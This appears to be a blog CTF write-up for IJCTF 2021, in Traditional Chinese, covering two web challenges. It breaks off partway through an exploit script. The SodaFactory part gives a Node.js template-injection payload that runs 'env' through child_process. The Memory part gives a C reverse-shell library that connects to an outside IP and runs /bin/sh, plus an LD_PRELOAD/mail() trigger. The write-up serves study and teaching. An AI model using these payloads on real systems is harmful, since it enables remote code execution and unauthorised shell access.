@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebSodaFactory Welcome to my SodaFactory. Note: You don’t need any bruteforce Author: TheGrandPew#0740  使用的庫是 sodajs，從以下程式碼看出引數 name 未經處理就傳入了，在渲染後輸出。 12345678app.post(&amp;#x27;&#x2F;makeSoda&amp;#x27;, (req, res)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IJCTF 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/603682ab.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="WebSodaFactory Welcome to my SodaFactory. Note: You don’t need any bruteforce Author: TheGrandPew#0740  使用的庫是 sodajs，從以下程式碼看出引數 name 未經處理就傳入了，在渲染後輸出。 12345678app.post(&amp;#x27;&#x2F;makeSoda&amp;#x27;, (req, res)">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627385844898360/411d16e19dfc8033c510d77994c0a67e59a61c02.png@100w">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627393585872788/6d42abe0873a356c246805386df413313aa7304c.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627394559649768/b9ac84b81dcff4e6d1cedebd96b2f292301a210d.png">
+<meta property="article:published_time" content="2021-07-29T16:12:00.000Z">
+<meta property="article:modified_time" content="2021-07-29T16:17:51.650Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627385844898360/411d16e19dfc8033c510d77994c0a67e59a61c02.png@100w">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/avatar.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>IJCTF 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/603682ab.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/aeac0311.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/603682ab.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/603682ab.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&text=IJCTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&is_video=false&description=IJCTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IJCTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/603682ab.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&title=IJCTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/603682ab.html&name=IJCTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/603682ab.html&t=IJCTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SodaFactory"><span class="toc-number">1.1.</span> <span class="toc-text">SodaFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memory"><span class="toc-number">1.2.</span> <span class="toc-text">Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BD%88-shell-%E7%9A%84%E6%A7%8B%E9%80%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">反彈 shell 的構造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensic"><span class="toc-number">2.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Riddle-Joker"><span class="toc-number">2.1.</span> <span class="toc-text">Riddle Joker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vault"><span class="toc-number">2.2.</span> <span class="toc-text">Vault</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%8C%85%E8%99%95%E7%90%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">流量包處理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP2-%E6%B5%81%E9%87%8F%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">HTTP2 流量的分析</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        IJCTF 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-29T16:12:00.000Z" itemprop="datePublished">2021-07-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SodaFactory"><a href="#SodaFactory" class="headerlink" title="SodaFactory"></a>SodaFactory</h3><blockquote>
+<p>Welcome to my SodaFactory.</p>
+<p>Note: You don’t need any bruteforce</p>
+<p>Author: TheGrandPew#0740</p>
+</blockquote>
+<p>使用的庫是 sodajs，從以下程式碼看出引數 name 未經處理就傳入了，在渲染後輸出。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/makeSoda&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> &#123;name, brand&#125; = req.body;</span><br><span class="line">  img = images[brand];</span><br><span class="line">  res.send(soda(<span class="string">`</span></span><br><span class="line"><span class="string">    &lt;title&gt;<span class="subst">$&#123;name&#125;</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;img src=&#x27;<span class="subst">$&#123;img&#125;</span>&#x27; alt=&#x27;<span class="subst">$&#123;name&#125;</span>&#x27;&gt;</span></span><br><span class="line"><span class="string">  `</span>,&#123;&#125;))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>因此對引數 name 嘗試 SSTI，構造 <code>&#123;&#123;1 + 1&#125;&#125;</code> 可以發現輸出的是 2，因此判定存在模板注入。使用如下載荷一把梭讀出環境變數找到 flag。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&quot; &quot;</span>.toString.constructor(<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;).toString()&quot;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>讀出如下環境變數。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NODE_VERSION&#x3D;12.18.1</span><br><span class="line">HOSTNAME&#x3D;53d556edba99</span><br><span class="line">YARN_VERSION&#x3D;1.22.4</span><br><span class="line">PORT&#x3D;3000</span><br><span class="line">HOME&#x3D;&#x2F;root</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">PWD&#x3D;&#x2F;app</span><br><span class="line">FLAG&#x3D;IJCTF&#123;Y00_maK3_g00D_50DA_MA73&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;Y00_maK3_g00D_50DA_MA73&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><blockquote>
+<p>Do you remember the past? You lived hard. Now, you need to take some rest by remembering your past.</p>
+<p>Run <code>/flag</code></p>
+<p>Note: You don’t need any bruteforce. The provided <code>phpinfo</code> has all the information for solving this challenge. So, I’ll not provide Dockerfile of this challenge.</p>
+<p>Author:<code>sqrtrev#9113</code></p>
+</blockquote>
+<p>題目的附件中給出瞭如下兩端程式碼和一個 PHPINFO 檔案。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;filter.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$errorno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;error_log(<span class="string">&quot;[<span class="subst">$errorno</span>] <span class="subst">$errstr</span>&quot;</span>, <span class="number">0</span>);&#125;;</span><br><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$r</span></span>)</span>&#123; <span class="variable">$r</span> = <span class="literal">True</span>; &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;chance&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>]) &gt; <span class="number">15</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>],<span class="number">1</span>) | checkLetterNums(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack T.T&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>]) &gt; <span class="number">32</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No bonus ~.~&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;bonus&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//filter.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span>, <span class="variable">$case</span> = <span class="number">0</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$case</span>)&#123;</span><br><span class="line">        <span class="variable">$additional</span> = [<span class="string">&quot;php&quot;</span>,<span class="string">&quot;/&quot;</span>];</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$additional</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkLetterNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; strlen(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">4</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>當引數 mode 為 chance 的時候會進行經過嚴格過濾的指令執行，而 mode 為 bonus 的時候則會進行 include。給出的 PHPINFO 檔案中 disable_function 幾乎禁用了所有的函式，加上過濾極為嚴格，因此直接指令執行是不可能的。可以注意到 <code>session.upload_progress.cleanup</code>  的值為 Off，也就是說當 POST 檔案上傳後 session 不會被清理，<code>session.use_strict_mode</code> 的值為 0。這意味著自定義一個會話 ID，進而可以利用 PHP_SESSION_UPLOAD_PROGRESS 進行檔案包含。上傳到 <code>/tmp</code> 的檔案會在程序結束後被刪除，因此需要寫出 <code>for(;;)&#123;&#125;</code> 來阻塞執行程序。</p>
+<h4 id="反彈-shell-的構造"><a href="#反彈-shell-的構造" class="headerlink" title="反彈 shell 的構造"></a>反彈 shell 的構造</h4><p>可以發現在 PHPINFO 檔案中，<code>putenv</code> 和 <code>mail</code> 兩個函式都還能使用，因此嘗試寫入 LD_PRELOAD，使用 <code>mail</code> 函式來觸發一個反彈 shell。構造出如下反彈 shell 的程式碼。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serveraddr</span>;</span></span><br><span class="line">        <span class="keyword">int</span> server_sockfd;</span><br><span class="line">        <span class="keyword">int</span> client_len;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">80</span>],rbuf[<span class="number">80</span>], *cmdBuf[<span class="number">2</span>]=&#123;<span class="string">&quot;/bin/sh&quot;</span>,(<span class="keyword">char</span> *)<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        server_sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">6</span>);</span><br><span class="line">        serveraddr.sin_family = AF_INET;</span><br><span class="line">        serveraddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;8.136.8.210&quot;</span>); </span><br><span class="line">        serveraddr.sin_port = htons(atoi(<span class="string">&quot;3255&quot;</span>));</span><br><span class="line">        client_len = <span class="keyword">sizeof</span>(serveraddr);</span><br><span class="line"></span><br><span class="line">        connect(server_sockfd, (struct sockaddr*)&amp;serveraddr, client_len);</span><br><span class="line"></span><br><span class="line">        dup2(server_sockfd, <span class="number">0</span>);</span><br><span class="line">        dup2(server_sockfd, <span class="number">1</span>);</span><br><span class="line">        dup2(server_sockfd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        execve(<span class="string">&quot;/bin/sh&quot;</span>,cmdBuf,<span class="number">0</span>);</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用如下指令進行編譯。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c -fPIC shell.c -o shell</span><br><span class="line">$ gcc -shared shell -o shell.so</span><br></pre></td></tr></table></figure>
+
+<p>編譯完成的二進位制檔案即可用於反彈 shell。再構造出如下 PHP 檔案用於進行 LD_PRELOAD 進而觸發反彈 shell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=./shell.so&quot;</span>); <span class="comment">//此處的檔名還需要更改</span></span><br><span class="line">    mail(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>寫出如下指令碼來一把梭觸發反彈 shell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Exploit</span></span><br><span class="line"><span class="variable">$URL</span> = <span class="string">&quot;http://8.136.8.210:10030&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> Client(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;base_uri&quot;</span> =&gt; <span class="variable">$URL</span>,</span><br><span class="line">    <span class="string">&quot;allow_redirects&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span 